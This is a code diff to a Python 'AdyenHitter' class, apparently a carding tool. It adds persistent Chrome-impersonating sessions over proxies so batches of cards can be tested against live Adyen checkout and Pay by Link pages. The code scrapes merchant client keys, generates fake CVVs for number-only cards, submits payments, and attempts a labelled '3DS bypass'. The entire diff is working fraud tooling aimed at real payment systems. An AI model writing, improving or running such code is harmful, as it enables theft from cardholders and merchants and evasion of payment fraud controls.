@@ -1003,9 +1003,28 @@ class AdyenHitter:
         result['error'] = f"Adyen: {rc or 'Unknown'}"
         return result
 
-    # ════════════════════════════════════════════════════════════════════════
-    #  PUBLIC
-    # ════════════════════════════════════════════════════════════════════════
+    async def open_session(self):
+        """Open a persistent ChromeSession for batch runs. Must be closed with close_session()."""
+        proxies = None
+        if self.proxy_data:
+            auth = (f"{self.proxy_data['username']}:{self.proxy_data['password']}@"
+                    if 'username' in self.proxy_data else "")
+            purl = f"http://{auth}{self.proxy_data['server'].replace('http://', '')}"
+            proxies = {"http": purl, "https": purl}
+        self._persistent_session = ChromeSession(impersonate="chrome131",
+                                                  proxies=proxies, timeout=12)
+        await self._persistent_session.__aenter__()
+        return self
+
+    async def close_session(self):
+        """Close the persistent ChromeSession."""
+        if hasattr(self, '_persistent_session') and self._persistent_session:
+            try:
+                await self._persistent_session.__aexit__(None, None, None)
+            except Exception:
+                pass
+            self._persistent_session = None
+
     async def hit_ccn(self, card: dict, attempt: int, user_id: int) -> dict:
         """CCN-only hit: encrypts card number + auto-generated expiry, no CVV."""
         t0 = time.time()
@@ -1017,110 +1036,119 @@ class AdyenHitter:
             ccn_mode=True,
         )
 
-        proxies = None
         if self.proxy_data:
             result['proxy_raw'] = self.proxy_data.get('raw')
-            auth = (f"{self.proxy_data['username']}:{self.proxy_data['password']}@"
-                    if 'username' in self.proxy_data else "")
-            purl = f"http://{auth}{self.proxy_data['server'].replace('http://', '')}"
-            proxies = {"http": purl, "https": purl}
+
+        # Use persistent session if available, else create a one-shot session
+        persistent = getattr(self, '_persistent_session', None)
+
+        async def _run(sess):
+            cfg = await self._get_config(sess)
+            result['merchant'] = cfg.get('merchant', 'Adyen Merchant')
+            if cfg.get('amount_value') is not None:
+                try:
+                    val = int(cfg['amount_value'])
+                    cur = cfg.get('amount_currency', 'USD')
+                    result['amount'] = f"{cur} {val / 100:.2f}"
+                except (ValueError, TypeError):
+                    result['amount'] = str(cfg['amount_value'])
+
+            if not cfg.get('adyen'):
+                result['error'] = "No Adyen checkout detected on this page"
+                result['decline_code'] = 'no_adyen'
+                result['response_time'] = round(time.time() - t0, 2)
+                return result
+
+            result['pbl_reusable'] = cfg.get('pbl_reusable', True)
+            if cfg.get('pbl_status') and cfg['pbl_status'] not in ('active', 'open', 'paymentPending'):
+                result['error'] = f"Pay by Link is {cfg['pbl_status']} (Already Consumed / Closed)"
+                result['decline_code'] = 'link_' + str(cfg['pbl_status']).lower()
+                result['response_time'] = round(time.time() - t0, 2)
+                return result
+
+            ck = cfg.get('clientKey')
+            if not ck:
+                result['error'] = "Adyen detected but clientKey not found"
+                result['decline_code'] = 'no_client_key'
+                result['response_time'] = round(time.time() - t0, 2)
+                return result
+
+            env = cfg.get('environment', 'live')
+
+            pk = cfg.get('publicKey')
+            if not pk:
+                pk = await self._fetch_pubkey(sess, ck, env)
+            if not pk:
+                result['error'] = f"Cannot fetch pubkey for {ck[:20]}…"
+                result['decline_code'] = 'no_pubkey'
+                result['response_time'] = round(time.time() - t0, 2)
+                return result
+
+            # CSE encrypt — CCN mode: attach synthetic CVV to satisfy merchant CVC validation
+            try:
+                cse = AdyenCSE(pk)
+                cvv = card.get('cvv')
+                if not cvv or cvv == '000':
+                    cvv = f"{random.randint(1000, 9999):04d}" if str(card['card']).startswith(('34', '37')) else f"{random.randint(100, 999):03d}"
+                    card['cvv'] = cvv
+                enc = cse.encrypt_card(
+                    card['card'], card['month'], card['year'], cvv, use_jwe=cfg.get('use_jwe', False))
+            except Exception as e:
+                result['error'] = f"CSE failed: {e}"
+                result['decline_code'] = 'cse_error'
+                result['response_time'] = round(time.time() - t0, 2)
+                return result
+
+            sid   = cfg.get('sessionId')
+            sdata = cfg.get('sessionData')
+
+            if sid and sdata:
+                data = await self._pay_session(
+                    sess, enc, sid, sdata, ck, env,
+                    att_id=cfg.get('checkoutAttemptId'),
+                    card_num=card.get('card'))
+            else:
+                data = await self._pay_direct(
+                    sess, enc, ck, env,
+                    card_num=card.get('card'))
+
+            if not data:
+                result['error'] = "Adyen session missing — dynamic session required"
+                result['decline_code'] = 'no_session'
+                result['response_time'] = round(time.time() - t0, 2)
+                return result
+
+            # 3DS bypass
+            rc = data.get('resultCode', '')
+            if rc in ('IdentifyShopper', 'ChallengeShopper', 'RedirectShopper'):
+                result['3ds_attempted'] = True
+                result['3ds_type'] = rc
+                if sid and sdata:
+                    resolved = await self._resolve_3ds(
+                        sess, data, sid,
+                        data.get('sessionData', sdata),
+                        ck, env)
+                    if resolved and resolved is not data:
+                        data = resolved
+                        result['3ds_resolved'] = True
+
+            result['response_time'] = round(time.time() - t0, 2)
+            result['raw_response'] = data
+            return self._parse(data, result)
 
         try:
-            async with ChromeSession(impersonate="chrome131",
-                                     proxies=proxies, timeout=7) as sess:
-
-                cfg = await self._get_config(sess)
-                result['merchant'] = cfg.get('merchant', 'Adyen Merchant')
-                if cfg.get('amount_value') is not None:
-                    try:
-                        val = int(cfg['amount_value'])
-                        cur = cfg.get('amount_currency', 'USD')
-                        result['amount'] = f"{cur} {val / 100:.2f}"
-                    except (ValueError, TypeError):
-                        result['amount'] = str(cfg['amount_value'])
-
-                if not cfg.get('adyen'):
-                    result['error'] = "No Adyen checkout detected on this page"
-                    result['decline_code'] = 'no_adyen'
-                    result['response_time'] = round(time.time() - t0, 2)
-                    return result
-
-                result['pbl_reusable'] = cfg.get('pbl_reusable', True)
-                if cfg.get('pbl_status') and cfg['pbl_status'] not in ('active', 'open', 'paymentPending'):
-                    result['error'] = f"Pay by Link is {cfg['pbl_status']} (Already Consumed / Closed)"
-                    result['decline_code'] = 'link_' + str(cfg['pbl_status']).lower()
-                    result['response_time'] = round(time.time() - t0, 2)
-                    return result
-
-                ck = cfg.get('clientKey')
-                if not ck:
-                    result['error'] = "Adyen detected but clientKey not found"
-                    result['decline_code'] = 'no_client_key'
-                    result['response_time'] = round(time.time() - t0, 2)
-                    return result
-
-                env = cfg.get('environment', 'live')
-
-                pk = cfg.get('publicKey')
-                if not pk:
-                    pk = await self._fetch_pubkey(sess, ck, env)
-                if not pk:
-                    result['error'] = f"Cannot fetch pubkey for {ck[:20]}…"
-                    result['decline_code'] = 'no_pubkey'
-                    result['response_time'] = round(time.time() - t0, 2)
-                    return result
-
-                # CSE encrypt — CCN mode: attach synthetic CVV to satisfy merchant CVC validation
-                try:
-                    cse = AdyenCSE(pk)
-                    cvv = card.get('cvv')
-                    if not cvv or cvv == '000':
-                        cvv = f"{random.randint(1000, 9999):04d}" if str(card['card']).startswith(('34', '37')) else f"{random.randint(100, 999):03d}"
-                        card['cvv'] = cvv
-                    enc = cse.encrypt_card(
-                        card['card'], card['month'], card['year'], cvv, use_jwe=cfg.get('use_jwe', False))
-                except Exception as e:
-                    result['error'] = f"CSE failed: {e}"
-                    result['decline_code'] = 'cse_error'
-                    result['response_time'] = round(time.time() - t0, 2)
-                    return result
-
-                sid   = cfg.get('sessionId')
-                sdata = cfg.get('sessionData')
-
-                if sid and sdata:
-                    data = await self._pay_session(
-                        sess, enc, sid, sdata, ck, env,
-                        att_id=cfg.get('checkoutAttemptId'),
-                        card_num=card.get('card'))
-                else:
-                    data = await self._pay_direct(
-                        sess, enc, ck, env,
-                        card_num=card.get('card'))
-
-                if not data:
-                    result['error'] = "Adyen session missing — dynamic session required"
-                    result['decline_code'] = 'no_session'
-                    result['response_time'] = round(time.time() - t0, 2)
-                    return result
-
-                # 3DS bypass
-                rc = data.get('resultCode', '')
-                if rc in ('IdentifyShopper', 'ChallengeShopper', 'RedirectShopper'):
-                    result['3ds_attempted'] = True
-                    result['3ds_type'] = rc
-                    if sid and sdata:
-                        resolved = await self._resolve_3ds(
-                            sess, data, sid,
-                            data.get('sessionData', sdata),
-                            ck, env)
-                        if resolved and resolved is not data:
-                            data = resolved
-                            result['3ds_resolved'] = True
-
-                result['response_time'] = round(time.time() - t0, 2)
-                result['raw_response'] = data
-                return self._parse(data, result)
+            if persistent:
+                return await _run(persistent)
+            else:
+                proxies = None
+                if self.proxy_data:
+                    auth = (f"{self.proxy_data['username']}:{self.proxy_data['password']}@"
+                            if 'username' in self.proxy_data else "")
+                    purl = f"http://{auth}{self.proxy_data['server'].replace('http://', '')}"
+                    proxies = {"http": purl, "https": purl}
+                async with ChromeSession(impersonate="chrome131",
+                                         proxies=proxies, timeout=7) as sess:
+                    return await _run(sess)
 
         except Exception as ex:
             result['response_time'] = round(time.time() - t0, 2)
@@ -1137,112 +1165,121 @@ class AdyenHitter:
             error=None, raw_response=None, is_live=False, psp=None,
         )
 
-        proxies = None
         if self.proxy_data:
             result['proxy_raw'] = self.proxy_data.get('raw')
-            auth = (f"{self.proxy_data['username']}:{self.proxy_data['password']}@"
-                    if 'username' in self.proxy_data else "")
-            purl = f"http://{auth}{self.proxy_data['server'].replace('http://', '')}"
-            proxies = {"http": purl, "https": purl}
+
+        persistent = getattr(self, '_persistent_session', None)
+
+        async def _run(sess):
+            # ── 1. get config ───────────────────────────────────────────
+            cfg = await self._get_config(sess)
+            result['merchant'] = cfg.get('merchant', 'Adyen Merchant')
+            if cfg.get('amount_value') is not None:
+                try:
+                    val = int(cfg['amount_value'])
+                    cur = cfg.get('amount_currency', 'USD')
+                    result['amount'] = f"{cur} {val / 100:.2f}"
+                except (ValueError, TypeError):
+                    result['amount'] = str(cfg['amount_value'])
+
+            if not cfg.get('adyen'):
+                result['error'] = "No Adyen checkout detected on this page"
+                result['decline_code'] = 'no_adyen'
+                result['response_time'] = round(time.time() - t0, 2)
+                return result
+
+            result['pbl_reusable'] = cfg.get('pbl_reusable', True)
+            if cfg.get('pbl_status') and cfg['pbl_status'] not in ('active', 'open', 'paymentPending'):
+                result['error'] = f"Pay by Link is {cfg['pbl_status']} (Already Consumed / Closed)"
+                result['decline_code'] = 'link_' + str(cfg['pbl_status']).lower()
+                result['response_time'] = round(time.time() - t0, 2)
+                return result
+
+            ck = cfg.get('clientKey')
+            if not ck:
+                result['error'] = "Adyen detected but clientKey not found"
+                result['decline_code'] = 'no_client_key'
+                result['response_time'] = round(time.time() - t0, 2)
+                return result
+
+            env = cfg.get('environment', 'live')
+
+            # ── 2. public key ───────────────────────────────────────────
+            pk = cfg.get('publicKey')
+            if not pk:
+                pk = await self._fetch_pubkey(sess, ck, env)
+            if not pk:
+                result['error'] = f"Cannot fetch pubkey for {ck[:20]}…"
+                result['decline_code'] = 'no_pubkey'
+                result['response_time'] = round(time.time() - t0, 2)
+                return result
+
+            # ── 3. CSE encrypt ──────────────────────────────────────────
+            try:
+                cse = AdyenCSE(pk)
+                enc = cse.encrypt_card(
+                    card['card'], card['month'], card['year'], card['cvv'], use_jwe=cfg.get('use_jwe', False))
+            except Exception as e:
+                result['error'] = f"CSE failed: {e}"
+                result['decline_code'] = 'cse_error'
+                result['response_time'] = round(time.time() - t0, 2)
+                return result
+
+            # ── 4. submit ───────────────────────────────────────────────
+            sid   = cfg.get('sessionId')
+            sdata = cfg.get('sessionData')
+
+            if sid and sdata:
+                data = await self._pay_session(
+                    sess, enc, sid, sdata, ck, env,
+                    att_id=cfg.get('checkoutAttemptId'),
+                    card_num=card.get('card'))
+            else:
+                data = await self._pay_direct(
+                    sess, enc, ck, env,
+                    card_num=card.get('card'))
+
+            if not data:
+                result['error'] = "Adyen session missing — dynamic session required"
+                result['decline_code'] = 'no_session'
+                result['response_time'] = round(time.time() - t0, 2)
+                return result
+
+            # ── 5. 3DS bypass ───────────────────────────────────────────
+            rc = data.get('resultCode', '')
+            if rc in ('IdentifyShopper', 'ChallengeShopper', 'RedirectShopper'):
+                result['3ds_attempted'] = True
+                result['3ds_type'] = rc
+                if sid and sdata:
+                    resolved = await self._resolve_3ds(
+                        sess, data, sid,
+                        data.get('sessionData', sdata),
+                        ck, env)
+                    if resolved and resolved is not data:
+                        data = resolved
+                        result['3ds_resolved'] = True
+
+            result['response_time'] = round(time.time() - t0, 2)
+            result['raw_response'] = data
+            return self._parse(data, result)
 
         try:
-            async with ChromeSession(impersonate="chrome131",
-                                     proxies=proxies, timeout=7) as sess:
-
-                # ── 1. get config ───────────────────────────────────────────
-                cfg = await self._get_config(sess)
-                result['merchant'] = cfg.get('merchant', 'Adyen Merchant')
-                if cfg.get('amount_value') is not None:
-                    try:
-                        val = int(cfg['amount_value'])
-                        cur = cfg.get('amount_currency', 'USD')
-                        result['amount'] = f"{cur} {val / 100:.2f}"
-                    except (ValueError, TypeError):
-                        result['amount'] = str(cfg['amount_value'])
-
-                if not cfg.get('adyen'):
-                    result['error'] = "No Adyen checkout detected on this page"
-                    result['decline_code'] = 'no_adyen'
-                    result['response_time'] = round(time.time() - t0, 2)
-                    return result
-
-                result['pbl_reusable'] = cfg.get('pbl_reusable', True)
-                if cfg.get('pbl_status') and cfg['pbl_status'] not in ('active', 'open', 'paymentPending'):
-                    result['error'] = f"Pay by Link is {cfg['pbl_status']} (Already Consumed / Closed)"
-                    result['decline_code'] = 'link_' + str(cfg['pbl_status']).lower()
-                    result['response_time'] = round(time.time() - t0, 2)
-                    return result
-
-                ck = cfg.get('clientKey')
-                if not ck:
-                    result['error'] = "Adyen detected but clientKey not found"
-                    result['decline_code'] = 'no_client_key'
-                    result['response_time'] = round(time.time() - t0, 2)
-                    return result
-
-                env = cfg.get('environment', 'live')
-
-                # ── 2. public key ───────────────────────────────────────────
-                pk = cfg.get('publicKey')
-                if not pk:
-                    pk = await self._fetch_pubkey(sess, ck, env)
-                if not pk:
-                    result['error'] = f"Cannot fetch pubkey for {ck[:20]}…"
-                    result['decline_code'] = 'no_pubkey'
-                    result['response_time'] = round(time.time() - t0, 2)
-                    return result
-
-                # ── 3. CSE encrypt ──────────────────────────────────────────
-                try:
-                    cse = AdyenCSE(pk)
-                    enc = cse.encrypt_card(
-                        card['card'], card['month'], card['year'], card['cvv'], use_jwe=cfg.get('use_jwe', False))
-                except Exception as e:
-                    result['error'] = f"CSE failed: {e}"
-                    result['decline_code'] = 'cse_error'
-                    result['response_time'] = round(time.time() - t0, 2)
-                    return result
-
-                # ── 4. submit ───────────────────────────────────────────────
-                sid   = cfg.get('sessionId')
-                sdata = cfg.get('sessionData')
-
-                if sid and sdata:
-                    data = await self._pay_session(
-                        sess, enc, sid, sdata, ck, env,
-                        att_id=cfg.get('checkoutAttemptId'),
-                        card_num=card.get('card'))
-                else:
-                    data = await self._pay_direct(
-                        sess, enc, ck, env,
-                        card_num=card.get('card'))
-
-                if not data:
-                    result['error'] = "Adyen session missing — dynamic session required"
-                    result['decline_code'] = 'no_session'
-                    result['response_time'] = round(time.time() - t0, 2)
-                    return result
-
-                # ── 5. 3DS bypass ───────────────────────────────────────────
-                rc = data.get('resultCode', '')
-                if rc in ('IdentifyShopper', 'ChallengeShopper', 'RedirectShopper'):
-                    result['3ds_attempted'] = True
-                    result['3ds_type'] = rc
-                    if sid and sdata:
-                        resolved = await self._resolve_3ds(
-                            sess, data, sid,
-                            data.get('sessionData', sdata),
-                            ck, env)
-                        if resolved and resolved is not data:
-                            data = resolved
-                            result['3ds_resolved'] = True
-
-                result['response_time'] = round(time.time() - t0, 2)
-                result['raw_response'] = data
-                return self._parse(data, result)
+            if persistent:
+                return await _run(persistent)
+            else:
+                proxies = None
+                if self.proxy_data:
+                    auth = (f"{self.proxy_data['username']}:{self.proxy_data['password']}@"
+                            if 'username' in self.proxy_data else "")
+                    purl = f"http://{auth}{self.proxy_data['server'].replace('http://', '')}"
+                    proxies = {"http": purl, "https": purl}
+                async with ChromeSession(impersonate="chrome131",
+                                         proxies=proxies, timeout=7) as sess:
+                    return await _run(sess)
 
         except Exception as ex:
             result['response_time'] = round(time.time() - t0, 2)
             result['decline_code'] = 'exception'
             result['error'] = str(ex)[:150]
             return result
+
